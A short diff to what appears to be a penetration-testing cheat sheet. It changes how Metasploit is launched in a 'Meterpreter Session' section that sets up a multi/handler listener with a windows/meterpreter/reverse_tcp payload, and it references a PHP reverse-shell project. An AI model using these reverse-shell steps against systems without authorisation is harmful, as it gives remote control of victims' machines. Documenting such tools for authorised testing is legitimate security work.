@@ -1719,7 +1719,7 @@ https://github.com/pentestmonkey/php-reverse-shell
 
 *Meterpreter Session*
 
-    ./msfconsole -q
+    msfconsole
     msf > use exploit/multi/handler
     msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
     payload => windows/meterpreter/reverse_tcp
